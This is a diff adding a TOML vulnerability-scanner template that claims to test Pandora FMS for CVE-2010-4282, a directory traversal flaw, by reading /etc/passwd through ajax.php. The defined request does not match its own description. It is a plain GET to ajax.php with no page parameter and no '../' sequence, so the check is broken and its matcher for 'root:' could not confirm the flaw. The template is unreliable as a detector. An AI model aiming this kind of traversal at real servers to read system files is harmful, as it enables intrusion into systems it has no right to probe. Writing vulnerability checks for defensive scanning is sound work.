@@ -1,0 +1,28 @@
+[info]
+author = "ave"
+description = "验证 Pandora FMS 3.1.1 之前版本的目录遍历/本地文件包含漏洞（CVE-2010-4282）。通过向 ajax.php 的 page 参数传入包含 ../ 序列的特制请求，尝试读取服务器上的本地敏感文件（如 /etc/passwd），以确认目标是否存在该漏洞。仅做无损读取验证，不修改或删除任何文件。"
+id = "POC-AVE-2010-0109"
+name = "Pandora FMS < 3.1.1 - Directory Traversal PoC"
+severity = "high"
+tags = ["ave-2010-0109"]
+vuln_id = [
+    "CVE-2010-4282",
+    "AVE-2010-0109",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "GET"
+path = "/pandora_console/ajax.php"
+protocol = "http"
+
+[poc.requests.headers]
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["root:"]
